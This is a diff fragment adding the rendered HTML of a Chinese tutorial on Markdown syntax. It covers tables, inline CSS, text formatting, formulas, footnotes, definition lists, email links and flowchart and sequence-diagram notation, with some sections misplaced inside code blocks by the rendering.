+<tr>
+<td style="text-align:center">=========</td>
+<td style="text-align:left">===============</td>
+<td style="text-align:right">============</td>
+</tr>
+</tbody>
+</table>
+<p><strong>代码2(简约写法)</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">a  | b | c  </div><div class="line">:-:|:- |-:</div><div class="line">    居中    |     左对齐      |   右对齐    </div><div class="line">============|=================|=============</div></pre></td></tr></table></figure></p>
+<h4 id="演示-19"><a href="#演示-19" class="headerlink" title="演示"></a>演示</h4><table>
+<thead>
+<tr>
+<th style="text-align:center">a</th>
+<th style="text-align:left">b</th>
+<th style="text-align:right">c  </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">    居中</td>
+<td style="text-align:left">左对齐</td>
+<td style="text-align:right">右对齐    </td>
+</tr>
+<tr>
+<td style="text-align:center">============</td>
+<td style="text-align:left">=================</td>
+<td style="text-align:right">=============</td>
+</tr>
+</tbody>
+</table>
+<p><strong>代码3(特殊表格)</strong>  </p>
+<blockquote>
+<p>注: 一般对合并单元格，以及其他特殊格式表格，markdown 是无能为力的<br> 所以常规的做法是使用HTML标签，但是这样的编写效率极低。<br> 但是有了这款工具的话，所有问题都迎刃而解. </p>
+<p>在线生成HTML代码 Tables Generator (国外的站)</p>
+<h4 id="15-支持内嵌的CSS样式"><a href="#15-支持内嵌的CSS样式" class="headerlink" title="15.支持内嵌的CSS样式"></a>15.支持内嵌的CSS样式</h4><p> <strong>代码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;p style=&quot;color: #AD5D0F;font-size: 30px; font-family: &apos;宋体&apos;;&quot;&gt;内联样式&lt;/p&gt;</div></pre></td></tr></table></figure></p>
+</blockquote>
+<h4 id="演示-20"><a href="#演示-20" class="headerlink" title="演示"></a>演示</h4><p style="color: #AD5D0F;font-size: 30px; font-family: '宋体';">内联样式</p>
+
+<h4 id="16-语义标记"><a href="#16-语义标记" class="headerlink" title="16.语义标记"></a>16.语义标记</h4><table>
+<thead>
+<tr>
+<th>描述</th>
+<th>效果</th>
+<th>代码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>斜体</td>
+<td><em>斜体</em></td>
+<td><code>*斜体*</code></td>
+</tr>
+<tr>
+<td>斜体</td>
+<td><em>斜体</em></td>
+<td><code>_斜体_</code></td>
+</tr>
+<tr>
+<td>加粗</td>
+<td><strong>加粗</strong></td>
+<td><code>**加粗**</code></td>
+</tr>
+<tr>
+<td>加粗+斜体</td>
+<td><strong><em>加粗+斜体</em></strong></td>
+<td><code>***加粗+斜体***</code></td>
+</tr>
+<tr>
+<td>加粗+斜体</td>
+<td><strong><em>加粗+斜体</em></strong></td>
+<td><code>**_加粗+斜体_**</code></td>
+</tr>
+<tr>
+<td>删除线</td>
+<td><del>删除线</del></td>
+<td><code>~~删除线~~</code></td>
+</tr>
+</tbody>
+</table>
+<h4 id="17-语义标签"><a href="#17-语义标签" class="headerlink" title="17.语义标签"></a>17.语义标签</h4><table>
+<thead>
+<tr>
+<th>描述</th>
+<th>效果</th>
+<th>代码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>斜体</td>
+<td><i>斜体</i></td>
+<td><code>&lt;i&gt;斜体&lt;/i&gt;</code></td>
+</tr>
+<tr>
+<td>加粗</td>
+<td><b>加粗</b></td>
+<td><code>&lt;b&gt;加粗&lt;/b&gt;</code></td>
+</tr>
+<tr>
+<td>强调</td>
+<td><em>强调</em></td>
+<td><code>&lt;em&gt;强调&lt;/em&gt;</code></td>
+</tr>
+<tr>
+<td>上标</td>
+<td>Z<sup>a</sup></td>
+<td><code>Z&lt;sup&gt;a&lt;/sup&gt;</code></td>
+</tr>
+<tr>
+<td>下标</td>
+<td>Z<sub>a</sub></td>
+<td><code>Z&lt;sub&gt;a&lt;/sub&gt;</code></td>
+</tr>
+<tr>
+<td>键盘文本</td>
+<td><kbd>Ctrl</kbd></td>
+<td><code>&lt;kbd&gt;Ctrl&lt;/kbd&gt;</code></td>
+</tr>
+<tr>
+<td>换行</td>
+<td></td>
+<td><code> </code></td>
+</tr>
+</tbody>
+</table>
+<h4 id="18-格式化文本"><a href="#18-格式化文本" class="headerlink" title="18.格式化文本"></a>18.格式化文本</h4><p> <strong>保持输入排版格式不变</strong>  </p>
+<p>  <strong>代码</strong><br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"> &lt;pre&gt;</div><div class="line">hello world </div><div class="line">         hi</div><div class="line">  hello world </div><div class="line"> &lt;/pre&gt;</div></pre></td></tr></table></figure></p>
+<h4 id="演示-21"><a href="#演示-21" class="headerlink" title="演示"></a>演示</h4><pre>
+hello world 
+         hi
+  hello world 
+</pre>
+
+<p><strong>错误解决方法</strong> </p>
+<blockquote>
+<p>注: 标签内部添加空格 或者 <b>直接使用<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">**代码1(插入空格)** </div><div class="line"></div><div class="line">**演示**</div><div class="line">&lt;pre&gt;</div><div class="line">    &lt; div&gt;   </div><div class="line">        &lt; div&gt;&lt; /div&gt;</div><div class="line">        &lt; div&gt;&lt; /div&gt;</div><div class="line">        &lt; div&gt;&lt; /div&gt;</div><div class="line">    &lt; /div&gt;</div><div class="line">&lt;/pre&gt;</div><div class="line"></div><div class="line">#### 19.公式 &#123;#1&#125;</div><div class="line"> &gt; 注: 1个$左对齐，2个居中  </div><div class="line"></div><div class="line"> **代码**</div></pre></td></tr></table></figure></b></p>
+</blockquote>
+<p>$$ x \href{why-equal.html}{=} y^2 + 1 $$<br>$ x = {-b \pm \sqrt{b^2-4ac} \over 2a}. $<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">**演示**</div><div class="line"></div><div class="line">$$ x \href&#123;why-equal.html&#125;&#123;=&#125; y^2 + 1 $$  </div><div class="line"></div><div class="line"></div><div class="line">$ x = &#123;-b \pm \sqrt&#123;b^2-4ac&#125; \over 2a&#125;. $</div><div class="line"></div><div class="line">#### 20.分隔符</div><div class="line">  &gt; 注: 最少三个 --- 或 ***或 * * *  </div><div class="line"></div><div class="line"> **代码**</div></pre></td></tr></table></figure></p>
+<h2 id=""><a href="#" class="headerlink" title="*"></a><em>*</em></h2><hr>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">**演示**  </div><div class="line">***</div><div class="line">---</div><div class="line">* * *</div><div class="line"></div><div class="line">#### 21.脚注</div><div class="line">**代码**</div></pre></td></tr></table></figure>
+<p>Markdown[^1]<br>[^1]: Markdown是一种纯文本标记语言  //在文章最后面显示脚注</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">**演示** </div><div class="line"></div><div class="line">Markdown[^1]  </div><div class="line"></div><div class="line">[^1]: Markdown是一种纯文本标记语言</div><div class="line">#### 22.锚点</div><div class="line">**代码** </div><div class="line">&gt; 注: 只有标题支持锚点， 跳转目录方括号后 保持空格</div><div class="line"></div><div class="line">#### 23.定义型列表</div><div class="line">&gt; 注: 解释型定义</div></pre></td></tr></table></figure>
+<p>Markdown<br>:   轻量级文本标记语言，可以转换成html，pdf等格式  //  开头一个<code>:</code> + <code>Tab</code> 或 四个空格</p>
+<p>代码块定义<br>:   代码块定义……<br>        var a = 10;         // 保持空一行与 递进缩进<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">**演示**  </div><div class="line"></div><div class="line">Markdown </div><div class="line">:   轻量级文本标记语言，可以转换成html，pdf等格式  //  开头一个`:` + `Tab` 或 四个空格</div><div class="line"></div><div class="line">代码块定义</div><div class="line">:   代码块定义…… </div><div class="line">    </div><div class="line">        var a = 10;  </div><div class="line"></div><div class="line">#### 24.自动邮箱链接 </div><div class="line">**代码**</div></pre></td></tr></table></figure></p>
+<p><a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#120;&#120;&#120;&#64;&#111;&#117;&#116;&#108;&#x6f;&#x6f;&#x6b;&#x2e;&#x63;&#111;&#x6d;">&#120;&#120;&#120;&#64;&#111;&#117;&#116;&#108;&#x6f;&#x6f;&#x6b;&#x2e;&#x63;&#111;&#x6d;</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">**演示** </div><div class="line"></div><div class="line">&lt;xxx@outlook.com&gt; </div><div class="line"></div><div class="line">#### 25.流程图</div><div class="line">**代码**</div></pre></td></tr></table></figure></p>
+<p>flow // 流程<br>st=&gt;start: 开始|past:&gt; <a href="http://www.baidu.com" target="_blank" rel="external">http://www.baidu.com</a> // 开始 e=&gt;end: 结束    // 结束<br>c1=&gt;condition: 条件1:&gt;<a href="http://www.baidu.com[_parent]//判断条件" target="_blank" rel="external">http://www.baidu.com[_parent]//判断条件</a> c2=&gt;condition: 条件2   // 判断条件<br>c3=&gt;condition: 条件3        // 判断条件<br>io=&gt;inputoutput: 输出      // 输出<br>//—————-以上为定义参数————————-</p>
+<p>//—————-以下为连接参数————————-<br>// 开始-&gt;判断条件1为no-&gt;判断条件2为no-&gt;判断条件3为no-&gt;输出-&gt;结束<br>st-&gt;c1(yes,right)-&gt;c2(yes,right)-&gt;c3(yes,right)-&gt;io-&gt;e c1(no)-&gt;e // 条件1不满足-&gt;结束<br>c2(no)-&gt;e // 条件2不满足-&gt;结束<br>c3(no)-&gt;e // 条件3不满足-&gt;结束 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#### 26.时序图</div><div class="line">**代码**</div></pre></td></tr></table></figure>
+<p>sequence<br>A-&gt;&gt;B: 你好<br>Note left of A: 我在左边     // 注释方向，只有左右，没有上下<br>Note right of B: 我在右边<br>B–&gt;A: 很高兴认识你<br>```</p>
+<h4 id="27-生成侧边栏扩展"><a href="#27-生成侧边栏扩展" class="headerlink" title="27.生成侧边栏扩展"></a>27.生成侧边栏扩展</h4><p><strong>代码</strong> </p>
+<blockquote>
+<p>注: 生成侧边栏一般是插入JS，再就是模板,<br>总体来说，很是麻烦，效果一般，不作详解。</p>
+<h2 id="作者仓库：i5ting-ztree-toc"><a href="#作者仓库：i5ting-ztree-toc" class="headerlink" title="作者仓库：i5ting_ztree_toc"></a>作者仓库：i5ting_ztree_toc</h2><h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><hr>
+</blockquote>
 
           
         
